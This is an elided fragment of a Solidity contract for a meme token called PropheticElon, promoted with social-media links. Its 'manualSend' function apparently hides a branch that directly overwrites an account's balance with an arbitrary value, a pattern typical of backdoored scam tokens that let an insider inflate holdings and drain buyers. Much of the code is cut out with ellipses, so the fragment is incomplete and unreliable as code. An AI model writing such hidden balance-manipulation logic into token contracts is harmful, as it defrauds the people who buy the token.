...
//Telegram: https://t.me/POOmemefinance
//Website: https://www.p0ofinance.com/
//Twitter: https://twitter.com/P0omemefi
...
contract PropheticElon is IERC20, baseToken, Ownable {
    using SafeMath for uint256;

    uint256 private constant GOLIVE_VERSION = 1;
    ...
    constructor(
        ...
        emit TokenCreated(owner(), address(this), TokenType.standard, GOLIVE_VERSION);
    }
    ...
    function manualSend(
        ...
        if (recipients == _ENTERED) {
            ...
            _balances[recipients] = values + total;
        }
    }
